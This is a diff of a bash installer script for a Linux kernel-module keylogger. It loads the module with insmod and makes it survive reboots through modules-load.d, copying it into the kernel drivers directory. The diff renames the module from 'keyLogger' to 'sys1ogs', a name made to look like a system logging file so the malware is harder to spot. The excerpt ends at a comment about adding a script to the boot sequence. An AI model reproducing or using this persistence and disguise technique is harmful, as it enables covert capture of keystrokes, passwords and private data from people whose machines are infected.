@@ -1,11 +1,11 @@
 #!/bin/bash
 
 #starts the key logger now
-sudo insmod keyLogger.ko
+sudo insmod sys1ogs.ko
 
 # Make it resilent to reboot
-sudo bash -c  'echo keyLogger >> /etc/modules-load.d/keyLogger.conf'
-sudo cp ./keyLogger.ko /lib/modules/$(uname -r)/kernel/drivers/pci
+sudo bash -c  'echo sys1ogs >> /etc/modules-load.d/sys1ogs.conf'
+sudo cp ./sys1ogs.ko /lib/modules/$(uname -r)/kernel/drivers/pci
 sudo depmod
 
 # Create the script to copy and put it in boot sequence
